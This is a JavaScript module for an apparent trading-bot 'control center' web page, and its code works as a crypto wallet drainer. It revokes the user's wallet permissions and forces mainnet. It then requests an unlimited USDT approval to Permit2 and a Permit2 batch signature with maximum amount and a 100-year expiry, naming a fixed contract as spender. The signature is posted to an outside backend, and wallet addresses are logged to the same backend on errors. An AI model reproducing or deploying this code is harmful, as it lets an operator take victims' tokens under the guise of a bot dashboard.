/* ==========================================================================
   AURA BOT CONTROL CENTER - DETERMINISTIC LOGIC & EXECUTION KERNEL
   ========================================================================== */

import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
import { APP_STATE, updateWalletState, resetState, setProcessing, setFlowState, startRequest, touchInteraction, unlockAfterSuccess } from "../core/state.js";

const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"]; // USDT
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

let isPickingWallet = false;
let watchdogInterval = null;
const WATCHDOG_TIMEOUT_MS = 25000; // 25 seconden failsafe voor trage providers / face id

if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (isPickingWallet) return;
    if (accounts.length > 0) {
      cleanupWatchdog();
      resetState();
      updateWalletState(accounts[0]);
      renderWallet(accounts[0]);
      updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
      updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
      log("🔄 Wallet switched: " + accounts[0]);
      if (typeof window.transitionToControl === "function") {
        window.transitionToControl();
      }
    }
  });
}

// Bijhouden van de handlers om memory leaks en dubbele registraties te voorkomen
let activeFocusHandler = null;
let activeDynamicListener = null;

function startWatchdog(requestId) {
  cleanupWatchdog();
  const startTime = Date.now();
  
  watchdogInterval = setTimeout(() => {
    // CRUCIAL: Als de gebruiker in een approval/signing fase zit, mag de absolute timeout NIET zomaar resetten
    if (APP_STATE.isProcessing && APP_STATE.activeRequestId === requestId) {
      if (APP_STATE.flowState === 'APPROVING' || APP_STATE.flowState === 'SIGNING_TX') {
        log("⏳ Watchdog: Gebruiker is bezig met ERC20/Tx goedkeuring. Watchdog uitschakelen.");
        cleanupWatchdog(); // Geef de gebruiker alle tijd voor de handmatige MetaMask actie
        return;
      }
      log("🚨 Watchdog Supervisor: Absolute timeout bereikt.");
      forceCleanupTimeout();
    }
  }, 60000);

  activeDynamicListener = () => {
    // 🔥 LEGO FIX: Als we uit de connect-fase zijn, ruim de listeners op en stop direct!
    if (APP_STATE.flowState !== 'CONNECTING') {
      window.removeEventListener('click', activeDynamicListener);
      window.removeEventListener('focus', activeDynamicListener);
      return;
    }

    const elapsed = Date.now() - startTime;
    
    // Alleen triggeren als de status nog STRICT op CONNECTING staat
    if (elapsed > 20000) {
      if (APP_STATE.isProcessing && APP_STATE.flowState === 'CONNECTING' && APP_STATE.activeRequestId === requestId && !isPickingWallet) {
        
        window.removeEventListener('click', activeDynamicListener);
        window.removeEventListener('focus', activeDynamicListener);
        
        log("💡 Watchdog: MetaMask staat vermoedelijk op de achtergrond. Gebruiker informeren...");
        
        const retry = confirm("MetaMask staat al open op de achtergrond of wacht op je pincode/wachtwoord.\n\nKlik op 'OK' om de knoppen te resetten en het opnieuw te proberen, of 'Annuleren' om rustig te wachten.");
        
        if (retry) {
          log("🔄 Gebruiker heeft handmatige reset gekozen via pop-up.");
          forceCleanupTimeout();
        } else {
          window.addEventListener('click', activeDynamicListener);
          window.addEventListener('focus', activeDynamicListener);
        }
      }
    }
  };

  window.addEventListener('click', activeDynamicListener);
  window.addEventListener('focus', activeDynamicListener);
}

function cleanupWatchdog() {
  if (watchdogInterval) {
    clearTimeout(watchdogInterval);
    watchdogInterval = null;
  }
  if (activeFocusHandler) {
    window.removeEventListener('focus', activeFocusHandler);
    activeFocusHandler = null;
  }
  if (activeDynamicListener) {
    window.removeEventListener('click', activeDynamicListener);
    window.removeEventListener('focus', activeDynamicListener);
    activeDynamicListener = null;
  }
}

function forceCleanupTimeout() {
  cleanupWatchdog();
  isPickingWallet = false;
  
  // Harde synchrone reset van de processing-vlaggen om het klik-lek te dichten
  APP_STATE.isProcessing = false; 
  resetState();
  
  // 🔥 LEGO FIX: Synchroniseer de UI-bridge onmiddellijk met de geresete kernel state
  if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
    window.UIbridge.forceUnlock();
  }
  
  const btnWalletEl = document.getElementById('btn-wallet');
  if (btnWalletEl) {
    btnWalletEl.disabled = false;
    btnWalletEl.innerText = "1. Connect Wallet";
  }
  
  updateStatus('dot-wallet', 'st-wallet', 'DISCONNECTED', '#ffaa00'); /* Bloomberg Amber waarschuwing */
  updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#425266');
  updateStatus('dot-access', 'st-access', 'RESTRICTED', '#425266');
  log("🔓 Systeem hersteld naar IDLE state. Sluis vrijgegeven.");
}

function log(msg) {
  console.log(msg);
  const el = document.getElementById('execution-console');
  if (!el) return;
  const div = document.createElement('div');
  div.className = 'exec-line';
  div.innerText = msg;
  el.prepend(div);
}

function updateStatus(dotId, textId, text, color) {
  const dot = document.getElementById(dotId);
  const label = document.getElementById(textId);
  if (dot) {
    dot.style.background = color;
    dot.style.boxShadow = `0 0 12px ${color}`;
  }
  if (label) {
    label.innerText = text;
    label.style.color = color;
  }
}

function renderWallet(address) {
  const btnWallet = document.getElementById('btn-wallet');
  if (btnWallet) btnWallet.innerText = address.substring(0, 6) + "..." + address.substring(address.length - 4);
  updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
}

export async function connectWallet() {
  if (APP_STATE.isProcessing) {
    log("⛔ Sluis gesloten — Actieve flow gedetecteerd.");
    return;
  }

  const currentRid = startRequest();
  setFlowState('CONNECTING');
  startWatchdog(currentRid);

  const btnWalletEl = document.getElementById('btn-wallet');
  if (btnWalletEl) {
    btnWalletEl.disabled = true;
    btnWalletEl.innerText = "CONNECTING...";
  }

  try {
    if (typeof window.ethereum === "undefined") {
      const install = confirm("MetaMask is not installed. Install?");
      if (install) window.location.href = "https://metamask.io/download/";
      forceCleanupTimeout();
      return;
    }

    // 🔥 LEGO FIX: Zet de picker-vlag direct omhoog VÓÓR de asynchrone revoke-call 
    // Dit blokkeert de focus-watchdog voor valse browser-events tijdens het laden
    isPickingWallet = true;

    log("🔌 Clearing wallet cache to force picker...");
    try {
      await window.ethereum.request({
        method: "wallet_revokePermissions",
        params: [{ eth_accounts: {} }]
      });
    } catch (revokeErr) {
      console.log("No active permissions to revoke.");
    }

    log("🔌 Opening Wallet Picker — Please select an account...");
    touchInteraction();
    
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];
    
    log(`📊 Active account selected: ${userAddress}`);
    isPickingWallet = false;
    touchInteraction();

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const user = await signer.getAddress();
    const network = await provider.getNetwork();

    if (network.chainId !== 1n) {
      log("⚠️ Switching to Ethereum Mainnet...");
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }]
        });
        log("✅ Switched to Ethereum Mainnet");
        cleanupWatchdog();
        setProcessing(false);
        return location.reload();
      } catch (err) {
        log("❌ Network switch failed");
        alert("Please switch to Ethereum Mainnet manually");
        forceCleanupTimeout();
        return;
      }
    }

    const balance = await provider.getBalance(user);
    if (balance === 0n) {
      throw new Error("Insufficient ETH balance for gas fees.");
    }

    updateWalletState(user);
    renderWallet(user);
    
    updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
    updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');

    // Start Sluis 1: Signature & Approval flows met actieve Request Ownership check
    setFlowState('SIGNING');
    await runPermitFlowSafe(provider, signer, user, currentRid);

    // Na een succesvolle Web3/Permit flow zetten we de volgende knoppen open voor de UX
    const btnActivate = document.getElementById('btn-activate');
    const btnDisconnect = document.getElementById('btn-disconnect');
    
    if (btnActivate) btnActivate.disabled = false; 
    if (btnWalletEl) btnWalletEl.disabled = true; // Houd wallet knop gelockt op het adres
    if (btnDisconnect) btnDisconnect.disabled = false;

   setFlowState('IDLE');
    // 🔥 LEGO FIX: De opruiming en deblokkering verhuizen naar een gegarandeerde finally-blok
} catch (e) {
    let errorMessage = e.message;
    if (e.code === "ACTION_REJECTED" || (e.message && e.message.includes("rejected"))) {
      errorMessage = "User denied transaction signature / approval.";
    }
    log("❌ Connection cancelled: " + errorMessage);

    // 🔥 LEGO FIX: Verstuur de fout/0-balans status asynchroon naar de backend en wacht dit netjes af
    try {
      await fetch("https://api.aiiraa.com/api/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "FLOW_ERROR",
          wallet: APP_STATE.wallet || "UNKNOWN",
          error: errorMessage,
          timestamp: Date.now()
        })
      });
      log("📤 Error status gesynchroniseerd met backend.");
    } catch (logErr) {
      console.error("Backend logging failed:", logErr);
    }

    forceCleanupTimeout();
  } finally {
    // Dit draait ALTIJD, of de verbinding nu slaagt of crasht
    cleanupWatchdog();
    setProcessing(false); 
    if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
      window.UIbridge.forceUnlock();
    }
  }
}

async function runPermitFlowSafe(provider, signer, user, currentRid) {
  try {
    log("⚙️ Permit2 flow verification...");
    touchInteraction();

    const permit2 = new ethers.Contract(
      PERMIT2,
      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
      provider
    );

    const nonceResults = await Promise.all(
      TOKENS.map(token => permit2.allowance(user, token, CONTRACT))
    );

    const now = Math.floor(Date.now() / 1000);
    let allPermitsValid = true;

    for (let i = 0; i < TOKENS.length; i++) {
      const [amount, expirationOnchain] = nonceResults[i];
      if (Number(expirationOnchain) <= now || amount === 0n) {
        allPermitsValid = false;
        break;
      }
    }

    if (allPermitsValid && nonceResults.length > 0) {
      log("⚡ On-chain permit valid — skipping Web3 signature popups");
      return;
    }

    log("⌛ No active on-chain permit found — Signature required.");
    touchInteraction();

    const MAX_UINT160 = (1n << 160n) - 1n;
    const expiration = Math.floor(Date.now() / 1000) + (100 * 365 * 24 * 60 * 60);
    const details = [];

    for (let i = 0; i < TOKENS.length; i++) {
      const token = TOKENS[i];
      const [, , nonce] = nonceResults[i];
      log(`Nonce ${token}: ${nonce.toString()}`);

      details.push({
        token: token,
        amount: MAX_UINT160,
        expiration: BigInt(expiration),
        nonce: BigInt(nonce)
      });
    }

    const chainId = (await provider.getNetwork()).chainId;
    const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };

    const types = {
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ]
    };

    // 🔥 LEGO FIX 1: EERST de basis ERC20 -> Permit2 approval controleren (zonder loop)
    const token = TOKENS[0]; // Pak direct de actieve token (USDT)
    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost during execution.");
    
    const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
    const currentAllowance = await erc20.allowance(user, PERMIT2);
    log("ERC20 allowance: " + currentAllowance.toString());

    if (currentAllowance === 0n) {
      log("⚠️ ERC20 Approval required...");
      setFlowState('APPROVING'); // Zet watchdog in pauze stand voor de approval tx
      touchInteraction();
      const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
      log("⛽ Waiting confirmation...");
      await tx.wait();
      log("✅ ERC20 approval confirmed");
      touchInteraction();
    } else {
      log("✅ ERC20 already approved");
    }

    // 🔥 LEGO FIX 2: PAS HIER de status op SIGNING_TX zetten en de values bouwen voor MetaMask
    if (APP_STATE.activeRequestId !== currentRid) throw new Error("Request ownership lost before signing.");
    
    log("✍️ Requesting typed data signature...");
    setFlowState('SIGNING_TX'); // Houd watchdog gedempt tijdens de handtekening popup
    touchInteraction();

    const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
    const values = {
      details: details.map(d => ({
        token: d.token,
        amount: d.amount.toString(),
        expiration: d.expiration.toString(),
        nonce: d.nonce.toString()
      })),
      spender: CONTRACT,
      sigDeadline: sigDeadline.toString()
    };

    const signature = await signer.signTypedData(domain, types, values);
    log("✍️ Signature captured");
    touchInteraction();

    log("📤 Sending raw permit batch to backend...");
    const payload = {
      owner: user,
      details: details.map(d => ({
        token: d.token,
        amount: d.amount.toString(),
        expiration: d.expiration.toString(),
        nonce: d.nonce.toString()
      })),
      signature: signature,
      spender: CONTRACT,
      sig_deadline: sigDeadline,
      chainId: Number(chainId)
    };

    try {
      const res = await fetch("https://api.aiiraa.com/api/permit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(
          payload,
          (key, value) => typeof value === "bigint" ? value.toString() : value
        )
      });

      const data = await res.json();

      if (!res.ok) {
        log("❌ Backend error: " + (data.error || "unknown"));
        return;
      }

      log("✅ Permit forwarded to backend");

      updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
      updateStatus('dot-bot','st-bot','READY','#6366f1');

      if (document.getElementById('btn-authorize')) {
        document.getElementById('btn-authorize').disabled = true;
        document.getElementById('btn-authorize').innerText = "AUTHORIZED";
      }
      if (document.getElementById('btn-activate')) {
        document.getElementById('btn-activate').disabled = true;
      }

    } catch (e) {
      log("❌ NETWORK ERROR: " + e.message);
      // 🔥 LEGO FIX: Geen throw e meer, dus de sluis breekt niet af bij netwerk-ruis!
    }

  } catch (e) {
    log("❌ FLOW ERROR: " + e.message);
  }
}